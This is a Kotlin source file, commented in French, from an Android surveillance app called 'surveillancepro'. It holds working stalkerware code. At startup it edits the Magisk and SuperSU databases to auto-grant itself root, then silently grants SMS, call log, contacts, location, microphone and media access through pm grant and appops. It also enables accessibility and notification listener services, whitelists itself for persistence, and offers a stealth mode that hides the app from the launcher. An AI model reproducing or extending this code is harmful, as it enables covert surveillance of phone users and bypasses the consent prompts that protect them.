package com.surveillancepro.android.root

import android.content.Context
import android.util.Log
import com.surveillancepro.android.data.EventQueue
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Séquence d'activation ROOT automatique.
 *
 * Quand l'app démarre, elle appelle RootActivator.activate() qui :
 * 1. Vérifie si le root est disponible (su binary présent)
 * 2. Demande l'accès root (popup Magisk/SuperSU — une seule fois)
 * 3. Configure Magisk pour accorder automatiquement le root à notre app
 * 4. Accorde toutes les permissions sensibles via root (pas besoin de popup Android)
 * 5. Cache l'app du launcher (mode furtif)
 * 6. Active les modules avancés (DB extraction, enregistrement d'appels, etc.)
 * 7. Enregistre le statut root pour ne pas refaire tout ça à chaque démarrage
 *
 * Si le root n'est pas disponible → ne fait rien, l'app continue en mode normal.
 * Si le root est refusé par l'utilisateur (popup Magisk denied) → idem, mode normal.
 */
object RootActivator {

    private const val TAG = "RootActivator"
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)

    enum class RootStatus {
        NOT_ROOTED,          // Pas de su binaire trouvé
        ROOT_DENIED,         // su existe mais accès refusé
        ROOT_ACTIVE,         // Root obtenu et configuré
        ALREADY_CONFIGURED,  // Root déjà configuré dans une session précédente
    }

    /**
     * Lance la séquence d'activation complète.
     * Appelé une fois au démarrage de l'app (dans un thread IO).
     * Retourne le statut final.
     */
    fun activate(context: Context): RootStatus {
        val prefs = context.getSharedPreferences("sp_root", Context.MODE_PRIVATE)

        // Si déjà configuré et root toujours actif, ne rien refaire
        if (prefs.getBoolean("root_configured", false)) {
            if (RootManager.isRooted()) {
                Log.d(TAG, "Root already configured and active")
                return RootStatus.ALREADY_CONFIGURED
            }
            // Root était configuré mais n'est plus disponible (Magisk désinstallé ?)
            prefs.edit().putBoolean("root_configured", false).apply()
        }

        // Étape 1 : Vérifier si root est disponible
        if (!RootManager.isRooted()) {
            Log.d(TAG, "Device is not rooted")
            logRootEvent(context, "root_check", "not_rooted")
            return RootStatus.NOT_ROOTED
        }

        Log.d(TAG, "Root detected! Starting activation sequence...")

        // Étape 2 : Test d'accès root (ceci trigger la popup Magisk/SuperSU)
        val testResult = RootManager.executeRootCommand("id")
        if (!testResult.success || !testResult.output.contains("uid=0")) {
            Log.w(TAG, "Root access denied by user")
            logRootEvent(context, "root_denied", "User refused root access")
            return RootStatus.ROOT_DENIED
        }

        Log.d(TAG, "Root access granted: ${testResult.output.trim()}")

        // Étape 3 : Configurer l'auto-grant Magisk (pour ne plus avoir la popup)
        configureMagiskAutoGrant(context)

        // Étape 4 : Accorder les permissions sensibles automatiquement via root
        grantAllPermissions(context)

        // Étape 5 : Activer le mode furtif
        enableStealthMode(context)

        // Étape 6 : Configuration système avancée
        configureSystemSettings(context)

        // Marquer comme configuré
        prefs.edit()
            .putBoolean("root_configured", true)
            .putLong("root_configured_at", System.currentTimeMillis())
            .putString("root_method", detectRootMethod())
            .apply()

        logRootEvent(context, "root_activated", "Full root activation completed")

        return RootStatus.ROOT_ACTIVE
    }

    /**
     * Configure Magisk pour accorder automatiquement le root à notre app
     * sans popup à chaque fois.
     */
    private fun configureMagiskAutoGrant(context: Context) {
        val pkg = context.packageName

        // Magisk : ajouter notre app à la politique de grant automatique
        RootManager.executeRootCommand(
            "magisk --sqlite \"REPLACE INTO policies (uid,package_name,policy,until,logging,notification) " +
            "VALUES ($(stat -c '%u' /data/data/$pkg),'$pkg',2,0,1,0)\" 2>/dev/null"
        )

        // SuperSU : même chose via sa base de données
        RootManager.executeRootCommand(
            "sqlite3 /data/data/eu.chainfire.supersu/databases/supersu.db " +
            "\"REPLACE INTO apps (uid,package_name,access,default_access,notification) " +
            "VALUES ($(stat -c '%u' /data/data/$pkg),'$pkg','grant','grant','')\" 2>/dev/null"
        )

        Log.d(TAG, "Auto-grant configured for Magisk/SuperSU")
    }

    /**
     * Accorde automatiquement TOUTES les permissions Android via root.
     * Plus besoin de popups "Autoriser l'accès à..." pour l'utilisateur.
     */
    private fun grantAllPermissions(context: Context) {
        val pkg = context.packageName

        val permissions = listOf(
            "android.permission.READ_SMS",
            "android.permission.RECEIVE_SMS",
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_CONTACTS",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.ACCESS_BACKGROUND_LOCATION",
            "android.permission.READ_PHONE_STATE",
            "android.permission.RECORD_AUDIO",
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.POST_NOTIFICATIONS",
            "android.permission.PROCESS_OUTGOING_CALLS",
        )

        val cmds = permissions.joinToString("; ") { "pm grant $pkg $it 2>/dev/null" }
        RootManager.executeRootCommand(cmds)

        // Accorder les permissions spéciales (AppOps)
        RootManager.executeRootCommand(
            "appops set $pkg READ_SMS allow 2>/dev/null; " +
            "appops set $pkg RECEIVE_SMS allow 2>/dev/null; " +
            "appops set $pkg READ_CALL_LOG allow 2>/dev/null; " +
            "appops set $pkg READ_CONTACTS allow 2>/dev/null; " +
            "appops set $pkg FINE_LOCATION allow 2>/dev/null; " +
            "appops set $pkg RECORD_AUDIO allow 2>/dev/null; " +
            "appops set $pkg GET_USAGE_STATS allow 2>/dev/null; " +
            "appops set $pkg SYSTEM_ALERT_WINDOW allow 2>/dev/null; " +
            "appops set $pkg READ_MEDIA_IMAGES allow 2>/dev/null; " +
            "appops set $pkg READ_MEDIA_VIDEO allow 2>/dev/null"
        )

        // Activer le NotificationListenerService automatiquement
        RootManager.executeRootCommand(
            "settings put secure enabled_notification_listeners " +
            "\$(settings get secure enabled_notification_listeners):$pkg/.services.SupervisionNotificationListener 2>/dev/null"
        )

        // Activer l'AccessibilityService automatiquement
        RootManager.executeRootCommand(
            "settings put secure enabled_accessibility_services " +
            "\$(settings get secure enabled_accessibility_services):$pkg/.services.SupervisionAccessibilityService 2>/dev/null; " +
            "settings put secure accessibility_enabled 1 2>/dev/null"
        )

        // Activer l'accès aux données d'utilisation
        RootManager.executeRootCommand("appops set $pkg GET_USAGE_STATS allow 2>/dev/null")

        Log.d(TAG, "All permissions granted via root")
    }

    /**
     * Active le mode furtif : l'app disparaît du launcher,
     * de la liste des apps récentes, et des paramètres.
     */
    private fun enableStealthMode(context: Context) {
        val pkg = context.packageName
        val prefs = context.getSharedPreferences("sp_root", Context.MODE_PRIVATE)

        if (!prefs.getBoolean("stealth_enabled", false)) {
            // On n'active PAS le stealth par défaut — c'est l'admin qui choisit
            // via une commande depuis le dashboard. Sinon on ne peut plus ouvrir l'app.
            Log.d(TAG, "Stealth mode available but not auto-enabled (admin must activate)")
            return
        }

        RootManager.hideFromLauncher(context)
        Log.d(TAG, "Stealth mode activated")
    }

    /**
     * Configure des paramètres système pour la persistance et la discrétion.
     */
    private fun configureSystemSettings(context: Context) {
        val pkg = context.packageName

        // Empêcher Android de tuer notre app en arrière-plan (battery optimization whitelist)
        RootManager.executeRootCommand(
            "dumpsys deviceidle whitelist +$pkg 2>/dev/null; " +
            "cmd appops set $pkg RUN_IN_BACKGROUND allow 2>/dev/null; " +
            "cmd appops set $pkg RUN_ANY_IN_BACKGROUND allow 2>/dev/null"
        )

        // Désactiver l'optimisation batterie pour notre app
        RootManager.executeRootCommand(
            "dumpsys battery unplug 2>/dev/null; " +
            "settings put global app_standby_enabled 0 2>/dev/null"
        )

        // S'assurer que l'app redémarre après un kill
        RootManager.executeRootCommand(
            "am set-inactive $pkg false 2>/dev/null"
        )

        Log.d(TAG, "System settings configured for persistence")
    }

    /**
     * Active le mode furtif (appelable depuis le dashboard via une commande).
     */
    fun enableStealth(context: Context): Boolean {
        if (!RootManager.isRooted()) return false
        val prefs = context.getSharedPreferences("sp_root", Context.MODE_PRIVATE)
        val result = RootManager.hideFromLauncher(context)
        if (result) {
            prefs.edit().putBoolean("stealth_enabled", true).apply()
            logRootEvent(context, "stealth_enabled", "App hidden from launcher")
        }
        return result
    }

    /**
     * Désactive le mode furtif.
     */
    fun disableStealth(context: Context): Boolean {
        if (!RootManager.isRooted()) return false
        val prefs = context.getSharedPreferences("sp_root", Context.MODE_PRIVATE)
        val result = RootManager.showInLauncher(context)
        if (result) {
            prefs.edit().putBoolean("stealth_enabled", false).apply()
            logRootEvent(context, "stealth_disabled", "App visible again in launcher")
        }
        return result
    }

    /**
     * Détecte la méthode de root utilisée.
     */
    private fun detectRootMethod(): String {
        return when {
            java.io.File("/data/adb/magisk").exists() -> "magisk"
            java.io.File("/system/app/SuperSU.apk").exists() -> "supersu"
            java.io.File("/system/app/Superuser.apk").exists() -> "superuser"
            java.io.File("/su/bin/su").exists() -> "chainfire"
            else -> "unknown"
        }
    }

    /**
     * Retourne un résumé du statut root pour le dashboard.
     */
    fun getStatus(context: Context): Map<String, Any> {
        val prefs = context.getSharedPreferences("sp_root", Context.MODE_PRIVATE)
        return mapOf(
            "isRooted" to RootManager.isRooted(),
            "isConfigured" to prefs.getBoolean("root_configured", false),
            "configuredAt" to (prefs.getLong("root_configured_at", 0L)),
            "rootMethod" to (prefs.getString("root_method", "none") ?: "none"),
            "stealthEnabled" to prefs.getBoolean("stealth_enabled", false),
        )
    }

    private fun logRootEvent(context: Context, action: String, detail: String) {
        try {
            val queue = EventQueue.getInstance(context)
            queue.enqueue("root_status", mapOf(
                "action" to action,
                "detail" to detail,
                "timestamp" to dateFormat.format(Date()),
            ))
        } catch (_: Exception) {}
    }
}
